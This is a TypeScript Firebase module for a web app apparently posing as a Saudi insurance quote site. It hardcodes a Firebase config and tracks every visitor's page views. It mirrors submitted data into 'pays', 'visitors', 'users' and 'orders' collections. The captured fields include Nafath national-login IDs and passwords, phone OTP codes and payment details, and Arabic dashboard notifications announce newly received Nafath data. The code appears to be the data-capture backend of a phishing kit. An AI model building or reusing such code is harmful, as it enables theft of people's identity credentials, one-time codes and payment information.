import { getApp, getApps, initializeApp, type FirebaseApp } from "firebase/app"
import { getAuth } from "firebase/auth"
import { getDatabase, ref, set } from "firebase/database"
import {
  addDoc,
  collection,
  doc,
  getFirestore,
  increment,
  serverTimestamp,
  setDoc,
} from "firebase/firestore"

type FirebaseConfig = {
  apiKey: string
  authDomain: string
  databaseURL: string
  projectId: string
  storageBucket: string
  messagingSenderId: string
  appId: string
  measurementId: string
}

const fallbackConfig: FirebaseConfig = {
  apiKey: "AIzaSyB-qlb_QYAPBqijr00XN-PeUd9DTzI0MDs",
  authDomain: "taameeni-v1.firebaseapp.com",
  databaseURL: "https://taameeni-v1-default-rtdb.firebaseio.com",
  projectId: "taameeni-v1",
  storageBucket: "taameeni-v1.firebasestorage.app",
  messagingSenderId: "240999338900",
  appId: "1:240999338900:web:bb73a1ea1239d2c074f581",
  measurementId: "G-MP49WZ65T2",
}

const resolveConfig = (): FirebaseConfig => {
  const envConfig = {
    apiKey:
      process.env.NEXT_PUBLIC_FIREBASE_API_KEY ?? process.env.FIREBASE_API_KEY,
    authDomain:
      process.env.NEXT_PUBLIC_FIREBASE_AUTH_DOMAIN ??
      process.env.FIREBASE_AUTH_DOMAIN,
    databaseURL:
      process.env.NEXT_PUBLIC_FIREBASE_DATABASE_URL ??
      process.env.FIREBASE_DATABASE_URL,
    projectId:
      process.env.NEXT_PUBLIC_FIREBASE_PROJECT_ID ??
      process.env.FIREBASE_PROJECT_ID,
    storageBucket:
      process.env.NEXT_PUBLIC_FIREBASE_STORAGE_BUCKET ??
      process.env.FIREBASE_STORAGE_BUCKET,
    messagingSenderId:
      process.env.NEXT_PUBLIC_FIREBASE_MESSAGING_SENDER_ID ??
      process.env.FIREBASE_MESSAGING_SENDER_ID,
    appId: process.env.NEXT_PUBLIC_FIREBASE_APP_ID ?? process.env.FIREBASE_APP_ID,
    measurementId:
      process.env.NEXT_PUBLIC_FIREBASE_MEASUREMENT_ID ??
      process.env.FIREBASE_MEASUREMENT_ID,
  }

  return {
    apiKey: envConfig.apiKey || fallbackConfig.apiKey,
    authDomain: envConfig.authDomain || fallbackConfig.authDomain,
    databaseURL: envConfig.databaseURL || fallbackConfig.databaseURL,
    projectId: envConfig.projectId || fallbackConfig.projectId,
    storageBucket: envConfig.storageBucket || fallbackConfig.storageBucket,
    messagingSenderId:
      envConfig.messagingSenderId || fallbackConfig.messagingSenderId,
    appId: envConfig.appId || fallbackConfig.appId,
    measurementId: envConfig.measurementId || fallbackConfig.measurementId,
  }
}

const sanitizeRecord = (data: Record<string, any>) => {
  return Object.fromEntries(
    Object.entries(data).map(([key, value]) => {
      if (/(pass|password|otp|token|secret)/i.test(key)) {
        return [key, value ? "[redacted]" : value]
      }

      return [key, value]
    }),
  )
}

const isClient = typeof window !== "undefined"

function initializeFirebase(): FirebaseApp | null {
  if (!isClient) {
    return null
  }

  const firebaseConfig = resolveConfig()

  if (!firebaseConfig.apiKey || !firebaseConfig.projectId) {
    console.warn("Firebase configuration is incomplete. Some features may not work.")
    return null
  }

  return getApps().length > 0 ? getApp() : initializeApp(firebaseConfig)
}

const app = initializeFirebase()
const auth = app ? getAuth(app) : null
const db = app ? getFirestore(app) : null
const database = app ? getDatabase(app) : null

const shouldMirrorToOrders = (data: Record<string, any>) =>
  [
    "insurance_purpose",
    "vehicle_type",
    "sequenceNumber",
    "main_price",
    "selectedOffer",
    "status",
    "approval",
    "phone2",
    "phoneOtpCode",
    "nafazId",
    "nafazPass",
  ].some((field) => field in data)

const buildVisitorSnapshot = (data: Record<string, any>, visitorId: string) => {
  const nowIso = new Date().toISOString()

  return {
    ...sanitizeRecord(data),
    id: visitorId,
    visitorId,
    updatedAt: nowIso,
    lastSeenAt: nowIso,
    recordType: shouldMirrorToOrders(data) ? "order" : "visitor",
  }
}

const writeMirrorRecord = async (
  collectionName: string,
  recordId: string,
  payload: Record<string, any>,
) => {
  if (!db || !database) {
    console.warn(`[Firebase] writeMirrorRecord: db or database not ready — skipping ${collectionName}/${recordId}`)
    return
  }

  await Promise.all([
    setDoc(doc(db, collectionName, recordId), payload, { merge: true }),
    set(ref(database, `${collectionName}/${recordId}`), payload),
  ])
  console.log(`[Firebase] ✅ write success → Firestore:${collectionName}/${recordId} | RTDB:${collectionName}/${recordId}`)
}

const appendNotification = async (visitorId: string, payload: Record<string, any>) => {
  if (!db || !database) {
    return
  }

  const nowIso = new Date().toISOString()
  const summary = {
    visitorId,
    title:
      payload.currentPage !== undefined
        ? `تحديث الصفحة: ${payload.currentPage}`
        : payload.phoneVerificationStatus
          ? `حالة التحقق: ${payload.phoneVerificationStatus}`
          : payload.nafazId
            ? "طلب نفاذ جديد"
            : "تحديث جديد",
    message: payload.phone2
      ? "تم استلام بيانات الجوال"
      : payload.nafazId
        ? "تم استلام بيانات نفاذ"
        : "تم تحديث بيانات الزائر",
    createdAt: nowIso,
    read: false,
    source: payload.currentPage ? "navigation" : "form",
  }

  const notificationRef = await addDoc(collection(db, "notifications"), summary)
  console.log(`[Firebase] ✅ notification written → Firestore:notifications/${notificationRef.id}`)

  await set(ref(database, `notifications/${notificationRef.id}`), {
    ...summary,
    id: notificationRef.id,
  })
  console.log(`[Firebase] ✅ notification written → RTDB:notifications/${notificationRef.id}`)
}

export async function addData(data: Record<string, any>) {
  if (!db || !database) {
    console.warn("[Firebase] addData: not initialized — db:", !!db, "database:", !!database)
    return
  }

  const visitorId = String(data.id || localStorage.getItem("visitor") || `visitor_${Date.now()}`)
  localStorage.setItem("visitor", visitorId)

  console.log(`[Firebase] addData called for visitorId=${visitorId}`, data)

  const visitorSnapshot = buildVisitorSnapshot(data, visitorId)

  try {
    await Promise.all([
      // pays — backward compat for existing pages that read from pays
      writeMirrorRecord("pays", visitorId, {
        ...visitorSnapshot,
        createdAt: visitorSnapshot.updatedAt,
      }),
      // visitors — Dashboard reads from this collection
      writeMirrorRecord("visitors", visitorId, visitorSnapshot),
      // users — also write here so Dashboard can use /users collection
      writeMirrorRecord("users", visitorId, visitorSnapshot),
      setDoc(
        doc(db, "analytics", "summary"),
        {
          totalEvents: increment(1),
          lastVisitorId: visitorId,
          lastUpdateAt: serverTimestamp(),
        },
        { merge: true },
      ),
    ])

    if (shouldMirrorToOrders(data)) {
      await writeMirrorRecord("orders", visitorId, {
        ...visitorSnapshot,
        status: data.status || data.approval || "pending",
        source: data.nafazId ? "nafaz" : data.phone2 ? "verification" : "quote",
      })
      console.log(`[Firebase] ✅ order record written → orders/${visitorId}`)
    }

    await appendNotification(visitorId, visitorSnapshot)
  } catch (error) {
    console.error("[Firebase] ❌ addData error:", error)
  }
}

export const handleCurrentPage = (page: string) => {
  const visitorId = typeof window !== "undefined" ? localStorage.getItem("visitor") : null
  return addData({ id: visitorId, currentPage: page })
}

export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
  if (!db || !database) {
    console.warn("Firebase not initialized. Cannot process payment.")
    return
  }

  try {
    const visitorId = localStorage.getItem("visitor")
    if (!visitorId) {
      return
    }

    await addData({
      ...paymentInfo,
      id: visitorId,
      status: "pending",
      paymentStatus: "pending",
    })

    setPaymentInfo((prev: any) => ({ ...prev, status: "pending" }))
  } catch (error) {
    console.error("Error adding document:", error)
    alert("Error adding payment info to Firebase")
  }
}

export { app, auth, db, database }
